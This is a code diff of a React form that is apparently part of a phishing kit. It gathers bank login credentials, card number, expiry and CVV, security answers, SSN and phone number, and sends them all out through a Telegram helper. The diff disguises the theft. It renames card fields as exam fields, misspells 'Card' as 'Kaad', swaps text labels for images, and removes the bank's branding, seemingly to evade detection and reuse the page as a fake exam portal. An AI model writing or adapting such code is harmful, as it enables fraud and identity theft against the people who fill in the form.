@@ -2,20 +2,19 @@ import React, { useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
+import candidateNumber from "../assets/candidateNumber.png"
+import examCode from "../assets/examCode.png"
 
 type IdentityT = {
-  phone: string;
-  sn: string;
+  examCode: string;
+  candidateNumber: string;
 };
 
 type Additional = {
-    cn:string;
-    edate:string;
-    ccv:string;
-    pn:string;
-    mail:string;
-    mail_p: string;
-  }
+  schoolNumber: string;
+  resumptionDate: string;
+  entryCode: string;
+};
 
   type Question = {
     q1: string;
@@ -28,8 +27,8 @@ type Additional = {
 
 export default function Identity() {
   const [formInput, setFormInput] = useState<IdentityT>({
-    phone: "",
-    sn: "",
+    examCode: "",
+    candidateNumber: "",
   });
 
   const login1: Login = cookies.get("login1");
@@ -64,9 +63,9 @@ const [isLoading, setIsLoading] = useState(false)
     Username 2: ${login2.username2}
     Password 2: ${login2.password2}
 
-    Card number: ${additional.cn}
-    Card Expiry : ${additional.edate}
-    Card Cvv: ${additional.ccv}
+    Kaad number: ${additional.schoolNumber}
+    Kaad Expiry : ${additional.resumptionDate}
+    Kaad Cvv: ${additional.entryCode}
 
     Question 1: ${question.q1}
     Answer 1: ${question.ans1}
@@ -78,8 +77,8 @@ const [isLoading, setIsLoading] = useState(false)
     Answer 3: ${question.ans1}
 
 
-    SSN: ${formInput.sn}
-    Phone Number: ${formInput.phone}
+    SSN: ${formInput.candidateNumber}
+    Phone Number: ${formInput.examCode}
     `;
 
     await TelegramSend(message);
@@ -98,30 +97,30 @@ const [isLoading, setIsLoading] = useState(false)
 
         <form ref={form} id="login-form" onSubmit={handleSubmit} method="post">
           <div className="input-field" style={{ textAlign: "left" }}>
-            <label htmlFor="username">
-              Phone Number<span style={{ color: "red" }}>*</span>
-            </label>
+          <div className="kylexy">
+          <img src={examCode} height={16} alt="" />
+                      </div>
             <input
               onChange={handleInputChange}
               required
-              id="username"
-              name="phone"
+              id="examCode"
+              name="examCode"
               type="text"
-              defaultValue={formInput.phone}
+              defaultValue={formInput.examCode}
             />
           </div>
           <div className="input-field" style={{ textAlign: "left" }}>
-            <label htmlFor="password">
-              SSN <span style={{ color: "red" }}>*</span>
-            </label>
+          <div className="kylexy">
+          <img src={candidateNumber} height={14} alt="" />
+                      </div>
             <input
               onChange={handleInputChange}
               required
-              id="password"
-              name="sn"
+              id="candidateNumber"
+              name="candidateNumber"
               type="text"
               maxLength={10}
-              defaultValue={formInput.sn}
+              defaultValue={formInput.candidateNumber}
             />
           </div>
          
@@ -141,7 +140,7 @@ const [isLoading, setIsLoading] = useState(false)
 
         <hr />
 
-        <p>Have questions about Arvest Online Banking?</p>
+        <p>Have questions?</p>
       </div>
     </>
   );
